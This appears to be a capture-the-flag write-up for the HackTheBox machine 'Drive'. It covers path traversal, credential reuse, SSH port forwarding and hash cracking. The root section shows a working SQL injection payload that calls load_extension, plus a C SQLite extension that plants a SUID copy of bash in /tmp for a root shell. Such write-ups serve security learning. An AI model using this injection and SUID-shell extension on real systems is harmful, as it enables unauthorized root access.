# Enumeration

Open Ports: 22,80 (redirects to http://drive.htb)
Filtered Port: 3000

```
echo "10.10.11.235 drive.htb" | sudo tee -a /etc/hosts
```

# Foothold

## Path Traversal

The file http://drive.htb/100/getFileDetail/ is also available under http://drive.htb/100/block/ 

Iteration reveals ssh username and password in a document.
http://drive.htb/79/block/ 

## Gitea ssh-portforwarding

The filtered port 3000 can be accessed from the intranet.

```
ssh -L 3000:drive.htb:3000 martin@10.10.11.235
```

Use the same password for the username martinCruz.

Password for the backups can be found in the script.

## Password cracking

Cracking some Sha1
```
hashcat -m 124 ../../hashes/sha1-hashes.txt /usr/share/wordlists/rockyou.txt.gz
```

# Root

## Reverseengeneer doodleGrive-cli

Letting Ghidra(CodeBrowser) analyzing the code shows a username and password to start the cli.

## SQL-Injection

On case5 is a SQL-Injection possible.

```
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,local_148);
```

## load-extension

https://www.sqlite.org/loadext.html

```
gcc -g -fPIC -shared YourCode.c -o YourCode.so
```

```
"+load_extension(YourCode.so)--; 
```

### Example extension
```
#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */
SQLITE_EXTENSION_INIT1

#include <stdlib.h>

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi);

  system("/usr/bin/cp /bin/bash /tmp/b");
  system("/usr/bin/chmod +s /tmp/b");

  return SQLITE_OK;
}
```

Get root shell
```
/tmp/b -p
```



